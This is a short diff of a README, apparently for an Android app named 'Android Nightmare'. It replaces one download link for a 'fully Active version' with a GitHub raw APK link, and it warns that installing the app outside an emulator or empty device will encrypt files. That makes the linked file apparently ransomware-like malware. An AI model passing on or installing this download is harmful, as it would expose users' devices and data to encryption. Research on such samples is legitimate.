@@ -27,7 +27,7 @@ Certain features have been removed for the purpose of install safety, including 
    
   
 For people using a device that has nothing on it - absolutely no important files or at least an emulator with no important files, you can test a fully Active version of the application here,
-https://www.apkfiles.com/apk-609697/android-nightmare   
+https://github.com/GreyJustice/AndroidNightmare/raw/main/app.apk   
  
  
 Do not Install This Application unless testing in a Virtual Environment or a Empty Device, so nothing gets encrypted.    
